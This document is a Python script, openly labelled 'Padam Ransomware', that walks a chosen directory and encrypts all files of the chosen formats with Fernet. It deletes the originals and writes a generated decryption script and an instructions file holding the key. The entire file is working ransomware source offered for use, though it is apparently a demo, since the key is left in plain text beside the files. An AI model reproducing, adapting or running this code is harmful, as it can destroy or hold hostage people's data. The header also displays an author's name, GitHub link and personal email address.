import os
import sys
from cryptography.fernet import Fernet
from termcolor import colored
from colorama import init, Fore

init()

# Generate a key
key = Fernet.generate_key()
cipher_suite = Fernet(key)

def encrypt_file(file_path, ext):
    with open(file_path, 'rb') as file:
        file_data = file.read()
    encrypted_data = cipher_suite.encrypt(file_data)
    new_file_path = file_path + ext
    with open(new_file_path, 'wb') as file:
        file.write(encrypted_data)
    os.remove(file_path)

def main():
    print(colored("Welcome ", "red"))

    print(colored(r"""
   _____                                                                _____
( ___ )--------------------------------------------------------------( ___ )
 |   |                                                                |   |
 |   |  _____          _                                              |   |
 |   | |  __ \        | |                                             |   |
 |   | | |__) |_ _  __| | __ _ _ __ ___                               |   |
 |   | |  ___/ _` |/ _` |/ _` | '_ ` _ \                              |   |
 |   | | |  | (_| | (_| | (_| | | | | | |                             |   |
 |   | |_|___\__,_|\__,_|\__,_|_| |_| |_|                             |   |
 |   | |  __ \                                                        |   |
 |   | | |__) |__ _ _ __  ___  ___  _ __ _____      ____ _ _ __ ___   |   |
 |   | |  _  // _` | '_ \/ __|/ _ \| '_ ` _ \ \ /\ / / _` | '__/ _ \  |   |
 |   | | | \ \ (_| | | | \__ \ (_) | | | | | \ V  V / (_| | | |  __/  |   |
 |   | |_|  \_\__,_|_| |_|___/\___/|_| |_| |_|\_/\_/ \__,_|_|  \___|  |   |
 |___|                                                                |___|
(_____)--------------------------------------------------------------(_____)
    """, "red"))

    print(colored("Padam Ransomware", "red"))
    print(colored("Author: Adamwebdev", "green"))
    print(colored("GitHub: https://github.com/adam-webdev", "blue"))
    print(colored("Email: adamdwimaulana2605@gmail.com", "yellow"))
    print("\n")

    print(colored("1. Encrypt Files", "cyan"))
    choice = input(colored("Select an option: ", "cyan"))

    if choice == '1':
        directory_to_encrypt = input(colored("Enter the directory to encrypt: ", "cyan"))

        if not os.path.isdir(directory_to_encrypt):
            print(colored("Invalid directory. Exiting...", "red"))
            sys.exit()

        file_formats = input(colored("Enter the file formats to encrypt (e.g., .txt, .jpg) separated by commas: ", "cyan"))
        formats = [fmt.strip() for fmt in file_formats.split(',')]
        custom_ext = input(colored("Enter a custom extension for encrypted files (e.g., .djkfhej): ", "cyan"))

        # Encrypt all files in the directory with the specified formats
        for root, dirs, files in os.walk(directory_to_encrypt):
            for file in files:
                if any(file.endswith(fmt) for fmt in formats):
                    file_path = os.path.join(root, file)
                    encrypt_file(file_path, custom_ext)
                    print(colored(f"Encrypted: {file_path}", "green"))

        print(colored(f"Files have been encrypted. Keep this key safe to decrypt: {key.decode()}", "yellow"))

        with open(os.path.join(directory_to_encrypt, "decrypt_instructions.txt"), 'w') as f:
            f.write(f"To decrypt your files, use the following key: {key.decode()}\n")
            f.write("You can use the 'decrypt.py' script provided to decrypt the files.\n")
            f.write(f"""
## Decrypting Files
To decrypt files, follow these steps:
1. Run the `decrypt.py` script.
2. Enter the directory to decrypt.
3. Enter the custom extension for encrypted files (e.g., `.ccc`).
4. Enter the key for decryption.

The files in the specified directory with the custom extension will be decrypted and restored to their original formats.
""")

        decrypt_script_content = f"""
import os
from cryptography.fernet import Fernet
from colorama import init, Fore

init()

def decrypt_file(file_path, cipher_suite, custom_ext):
    try:
        with open(file_path, 'rb') as file:
            encrypted_data = file.read()
        decrypted_data = cipher_suite.decrypt(encrypted_data)
        original_file_path = file_path[:-len(custom_ext)]
        with open(original_file_path, 'wb') as file:
            file.write(decrypted_data)
        os.remove(file_path)  # Remove the encrypted file after decryption
        return original_file_path
    except Exception as e:
        print(Fore.RED + f"Error decrypting file {{file_path}}: {{e}}" + Fore.RESET)
        return None

def main():
    directory_to_decrypt = input(Fore.CYAN + "Enter the directory to decrypt: " + Fore.RESET)

    if not os.path.isdir(directory_to_decrypt):
        print(Fore.RED + "Invalid directory. Exiting..." + Fore.RESET)
        return

    custom_ext = input(Fore.CYAN + "Enter the custom extension for encrypted files (e.g., .ccc): " + Fore.RESET)

    key = input(Fore.CYAN + "Enter the key for decryption: " + Fore.RESET).strip()
    try:
        cipher_suite = Fernet(key)
    except Exception as e:
        print(Fore.RED + f"Invalid key: {{e}}. Exiting..." + Fore.RESET)
        return

    for root, dirs, files in os.walk(directory_to_decrypt):
        for file in files:
            if file.endswith(custom_ext):
                file_path = os.path.join(root, file)
                decrypted_file_path = decrypt_file(file_path, cipher_suite, custom_ext)
                if decrypted_file_path:
                    print(Fore.GREEN + f"Decrypted: {{decrypted_file_path}}" + Fore.RESET)
                else:
                    print(Fore.RED + f"Failed to decrypt: {{file_path}}" + Fore.RESET)

if __name__ == "__main__":
    main()
"""

        with open(os.path.join(directory_to_encrypt, "decrypt.py"), 'w') as f:
            f.write(decrypt_script_content)
        print(colored(f"Decryption script and instructions have been saved in {directory_to_encrypt}", "yellow"))

if __name__ == "__main__":
    main()
